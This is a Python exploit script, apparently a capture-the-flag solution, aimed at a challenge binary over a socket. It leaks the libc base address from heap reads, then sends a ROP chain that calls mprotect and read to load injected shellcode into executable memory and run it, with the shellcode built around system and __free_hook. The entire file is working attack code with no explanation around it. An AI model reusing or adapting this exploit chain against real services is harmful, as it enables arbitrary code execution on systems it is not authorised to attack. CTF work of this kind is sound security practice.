import os
from ptrlib import *

def new(size):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter(": ", str(size))
def get(index):
    sock.sendlineafter("> ", "3")
    sock.sendlineafter(": ", str(index))
    return int(sock.recvlineafter(" = "))

HOST = os.getenv('HOST', 'localhost')
PORT = os.getenv('PORT', '9004')

libc = ELF("./libc-2.31.so")
#sock = Process("../distfiles/bin/chall")
sock = Socket(HOST, int(PORT))

# Leak libc base
new(0x88)
new(4)
new(0x88)
libc.set_base(get(0) - libc.main_arena() - 0x60)
rop_pop_rdi = libc.base + 0x00023b72
rop_pop_rsi = libc.base + 0x0002604f
rop_pop_rdx_r12 = libc.base + 0x00119241

# Prepare shellcode
addr_shellcode = libc.section('.bss') + 0x1000
payload  = b'A' * 0x28
payload += flat([
    # mprotect(shellcode, 0x1000, 7)
    rop_pop_rdx_r12, 7, 0xdeadbeef,
    rop_pop_rsi, 0x2000,
    rop_pop_rdi, addr_shellcode & 0xfffffffffffff000,
    libc.symbol('mprotect'),
    # read(0, shellcode, 0x1000)
    rop_pop_rdx_r12, 0x1000, 0xdeadbeef,
    rop_pop_rsi, addr_shellcode,
    rop_pop_rdi, 0,
    libc.symbol('read'),
    # shellcode()
    addr_shellcode
], map=p64)
sock.sendafter("> ", payload)

# Inject shellcode
shellcode = nasm(
    open("shellcode.S").read().format(
        environ=libc.symbol('environ'),
        free_hook=libc.symbol('__free_hook') // 8,
        system=libc.symbol('system')
    ),
    bits=64
)
sock.send(shellcode)

sock.close()
